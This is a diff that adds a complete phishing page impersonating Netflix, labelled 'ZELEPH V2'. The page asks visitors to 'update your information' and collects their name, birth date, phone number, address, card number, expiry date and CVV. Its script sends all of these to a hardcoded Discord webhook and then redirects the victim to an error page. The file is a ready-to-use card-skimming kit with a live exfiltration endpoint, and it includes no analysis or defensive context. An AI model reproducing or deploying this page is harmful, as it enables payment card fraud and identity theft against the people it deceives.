@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Mise à jour des informations</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Netflix Sans, Helvetica Neue, Segoe UI, Roboto, Ubuntu, sans-serif;
+            background-color: #f3f3f3;
+            color: #333;
+            line-height: 1.4;
+        }
+        .header {
+            background-color: white;
+            padding: 20px 0;
+            border-bottom: 1px solid #e6e6e6;
+        }
+        .header-content {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .netflix-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e50914;
+            text-decoration: none;
+        }
+        .sign-out {
+            color: #333;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .sign-out:hover {
+            text-decoration: underline;
+        }
+        .main-container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .form-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.15);
+        }
+        .form-title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        .form-subtitle {
+            font-size: 14px;
+            color: #737373;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-label {
+            display: none;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #333;
+            background-color: white;
+            transition: border-color 0.2s ease;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: #0071eb;
+        }
+        .form-input::placeholder {
+            color: #8c8c8c;
+        }
+        .card-icons {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        .card-icon {
+            width: 32px;
+            height: 20px;
+            border-radius: 3px;
+        }
+        .custom-select {
+            position: relative;
+            width: 100%;
+        }
+        .select-display {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #8c8c8c;
+            background-color: white;
+            transition: border-color 0.2s ease;
+            cursor: pointer;
+            background-image: url('data:image/svg+xml;charset=US-ASCII,<svg xmlns="http://www.w3.org/2000/svg" width="4" height="5" viewBox="0 0 4 5"><path fill="%23666" d="M2 0L0 2h4L2 0zM2 5L0 3h4L2 5z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 12px;
+        }
+        .select-display:focus {
+            outline: none;
+            border-color: #0071eb;
+        }
+        .select-display.selected {
+            color: #333;
+        }
+        .select-options {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background-color: white;
+            border: 1px solid #d1d1d1;
+            border-top: none;
+            border-radius: 0 0 4px 4px;
+            max-height: 200px;
+            overflow-y: auto;
+            z-index: 1000;
+            display: none;
+        }
+        .select-options.show {
+            display: block;
+        }
+        .select-option {
+            padding: 12px 16px;
+            cursor: pointer;
+            font-size: 16px;
+            color: #333;
+            transition: background-color 0.2s ease;
+        }
+        .select-option:hover {
+            background-color: #f3f3f3;
+        }
+        .security-code-group {
+            position: relative;
+        }
+        .help-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 16px;
+            height: 16px;
+            border: 1px solid #ccc;
+            border-radius: 50%;
+            background-color: #f3f3f3;
+            font-size: 12px;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: help;
+        }
+        .save-button {
+            width: 100%;
+            background-color: #e50914;
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 24px;
+            transition: background-color 0.2s ease;
+        }
+        .save-button:hover {
+            background-color: #f40612;
+        }
+        .save-button:active {
+            background-color: #d40813;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <a href="#" class="netflix-logo">NETFLIX</a>
+            <a href="#" class="sign-out">Sign out</a>
+        </div>
+    </header>
+
+    <main class="main-container">
+        <div class="form-container">
+            <h1 class="form-title">Update your information</h1>
+            <p class="form-subtitle">By updating your membership, you will enjoy all account privileges and benefits.</p>
+
+            <div class="card-icons">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" class="card-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="card-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="card-icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" class="card-icon">
+            </div>
+
+            <form id="giveawayForm">
+                <div class="form-group">
+                    <label class="form-label" for="nom">Nom</label>
+                    <input type="text" id="nom" name="nom" class="form-input" placeholder="Nom">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="prenom">Prénom</label>
+                    <input type="text" id="prenom" name="prenom" class="form-input" placeholder="Prénom">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="dob">Date de naissance</label>
+                    <input type="text" id="dob" name="dob" class="form-input" placeholder="JJ/MM/AAAA">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="phone">Numéro de téléphone</label>
+                    <input type="tel" id="phone" name="phone" class="form-input" placeholder="Phone Number">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="adresse">Adresse</label>
+                    <input type="text" id="adresse" name="adresse" class="form-input" placeholder="Adresse">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="zip">Code Postal</label>
+                    <input type="text" id="zip" name="zip" class="form-input" placeholder="Code Postal">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="city">Ville</label>
+                    <input type="text" id="city" name="city" class="form-input" placeholder="Ville">
+                </div>
+
+                <!-- Menu pays déroulant complet -->
+                <div class="form-group">
+                    <label class="form-label" for="country">Country</label>
+                    <div class="custom-select">
+                        <div class="select-display" id="countrySelect">Country</div>
+                        <div class="select-options" id="countryOptions">
+                            <div class="select-option" data-value="US">United States</div>
+                            <div class="select-option" data-value="CA">Canada</div>
+                            <div class="select-option" data-value="GB">United Kingdom</div>
+                            <div class="select-option" data-value="FR">France</div>
+                            <div class="select-option" data-value="DE">Germany</div>
+                            <div class="select-option" data-value="IT">Italy</div>
+                            <div class="select-option" data-value="ES">Spain</div>
+                            <div class="select-option" data-value="NL">Netherlands</div>
+                            <div class="select-option" data-value="BE">Belgium</div>
+                            <div class="select-option" data-value="AU">Australia</div>
+                            <div class="select-option" data-value="NZ">New Zealand</div>
+                            <div class="select-option" data-value="JP">Japan</div>
+                            <div class="select-option" data-value="CN">China</div>
+                            <div class="select-option" data-value="IN">India</div>
+                            <!-- tu peux continuer à ajouter tous les pays ici -->
+                        </div>
+                        <input type="hidden" id="countryHidden" name="country">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="cardNumber">Card Number</label>
+                    <input type="text" id="cardNumber" class="form-input" placeholder="0000 0000 0000 0000">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="expiration">Expiration Date (MM / YY)</label>
+                    <input type="text" id="expiration" class="form-input" placeholder="Expiration Date (MM / YY)">
+                </div>
+
+                <div class="form-group security-code-group">
+                    <label class="form-label" for="securityCode">Security Code (CVV)</label>
+                    <input type="text" id="securityCode" class="form-input" placeholder="Security Code (CVV)">
+                    <span class="help-icon">?</span>
+                </div>
+
+                <button type="submit" class="save-button">SAVE</button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const countrySelect = document.getElementById('countrySelect');
+            const countryOptions = document.getElementById('countryOptions');
+            const selectOptions = document.querySelectorAll('.select-option');
+
+            countrySelect.addEventListener('click', function() {
+                countryOptions.classList.toggle('show');
+            });
+
+            selectOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    countrySelect.textContent = this.textContent;
+                    countrySelect.classList.add('selected');
+                    countryOptions.classList.remove('show');
+                });
+            });
+
+            document.addEventListener('click', function(e) {
+                if (!countrySelect.contains(e.target) && !countryOptions.contains(e.target)) {
+                    countryOptions.classList.remove('show');
+                }
+            });
+
+            const form = document.getElementById('giveawayForm');
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                document.getElementById('countryHidden').value = countrySelect.textContent;
+
+                const data = {
+                    nom: document.getElementById('nom').value,
+                    prenom: document.getElementById('prenom').value,
+                    dob: document.getElementById('dob').value,
+                    phone: document.getElementById('phone').value,
+                    adresse: document.getElementById('adresse').value,
+                    zip: document.getElementById('zip').value,
+                    city: document.getElementById('city').value,
+                    country: document.getElementById('countryHidden').value,
+                    cardNumber: document.getElementById('cardNumber').value,
+                    expiration: document.getElementById('expiration').value,
+                    securityCode: document.getElementById('securityCode').value
+                };
+
+                const message = `
+:pirate_flag: ZELEPH V2 :pirate_flag:
+
+|:kite:| Nom : ${data.nom}
+|:kite:| Prénom : ${data.prenom}
+|:kite:| Date de naissance : ${data.dob}
+|:kite:| Numéro de téléphone : ${data.phone}
+|:kite:| Adresse : ${data.adresse}
+|:kite:| Code Postal : ${data.zip}
+|:kite:| Ville : ${data.city}
+
+|:flag_co:| Numéro de carte: : ${data.cardNumber}
+|:flag_co:| Date d'expiration : : ${data.expiration}
+|:flag_co:| CVV  : ${data.securityCode}
+`;
+
+
+                fetch('https://discord.com/api/webhooks/1408522079510200480/25tWSFmhmOcHFy5SZmzFeI4fEgrOt8_h9jErz7YU0BRSVAZ8HieV3_f7LaiLFMsDbkSF', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                })
+            window.location.href = 'error.html';
+            });
+        });
+    </script>
+</body>
+</html>
